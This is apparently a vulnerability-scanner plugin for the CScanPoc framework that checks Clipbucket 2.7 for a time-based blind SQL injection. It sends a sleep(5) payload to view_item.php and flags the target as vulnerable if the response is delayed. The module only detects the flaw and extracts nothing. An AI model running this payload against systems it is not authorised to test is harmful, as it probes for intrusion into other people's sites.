# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
import urllib.request
import urllib.error
import urllib.parse
import http.client


class Vuln(ABVuln):
    vuln_id = 'Clipbucket_0001'  # 平台漏洞编号，留空
    name = 'Clipbucket 2.7 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-03-03'  # 漏洞公布时间
    desc = '''
        ClipBucket is an OpenSource Multimedia Management Script Provided Free to the Community.
        This script comes with all the bells & whistles required to start your own Video Sharing website like Youtube,
        Metacafe, Veoh, Hulu or any other top video distribution application in matter of minutes.
        ClipBucket is fastest growing script which was first started as Youtube Clone but now its
        advance features & enhancements makes it the most versatile, reliable & scalable media distribution
        platform with latest social networking features, while staying light on your pockets.
        Whether you are a small fan club or a big Multi Tier Network operator,
        Clipbucket will fulfill your video management needs.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Clipbucket'  # 漏洞应用名称
    product_version = 'Clipbucket 2.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0462c66f-6e23-42a5-ad5f-49e0804eb3fc'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/clipbucket/view_item.php?item=a%27and%20sleep(5)-- # &type=photos&collection=9'
            start_time = time.time()
            response = requests.get(self.target + payload)
            _page = response.text

            if time.time() - start_time > 5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
